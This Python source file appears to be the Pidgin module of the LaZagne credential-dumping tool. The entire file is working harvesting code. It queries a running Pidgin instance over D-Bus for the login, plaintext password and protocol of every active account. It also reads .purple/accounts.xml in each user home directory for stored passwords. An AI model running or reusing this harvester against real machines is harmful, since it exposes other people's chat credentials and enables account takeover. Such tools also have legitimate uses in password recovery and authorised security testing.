#!/usr/bin/env python
# -*- coding: utf-8 -*- 
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.constant import *
import xml.etree.cElementTree as ET
from lazagne.config import homes
import os

try:
    import dbus
except ImportError as e:
    dbus = None


class Pidgin(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, 'pidgin', 'chats')

	# If pidgin is started, use the api to retrieve all passwords
	def check_if_pidgin_started(self):
		if not dbus:
			print_debug('DEBUG', 'Dbus not installed: sudo apt-get install python-dbus')
			return False
		try:
			pwdFound 	= []
			bus 		= dbus.SessionBus()
			purple 		= bus.get_object("im.pidgin.purple.PurpleService","/im/pidgin/purple/PurpleObject","im.pidgin.purple.PurpleInterface")
			acc 		= purple.PurpleAccountsGetAllActive()

			for x in range(len(acc)):
				_acc = purple.PurpleAccountsGetAllActive()[x]
				pwdFound.append(
					{	
						'Login'		: purple.PurpleAccountGetUsername(_acc), 
						'Password'	: purple.PurpleAccountGetPassword(_acc),
						'Protocol' 	: purple.PurpleAccountGetProtocolName(_acc),
					}
				)
			return pwdFound
		except:
			# [!] Pidgin is not started :-(
			return False

	def run(self, software_name=None):
		pwdFound = []
		try:
			pwdTab = self.check_if_pidgin_started()
			if pwdTab:
				pwdFound = pwdTab
		except:
			pass

		for path in homes.get(file=os.path.join('.purple', 'accounts.xml')):
			tree = ET.ElementTree(file=path)
			root = tree.getroot()

			for account in root.findall('account'):
				if account.find('name') is not None:
					name 		= account.find('name')
					password 	= account.find('password')

					if name is not None and password is not None:
						pwdFound.append(
							{
								'Login'		: name.text, 
								'Password'	: password.text
							}
						)

		return pwdFound
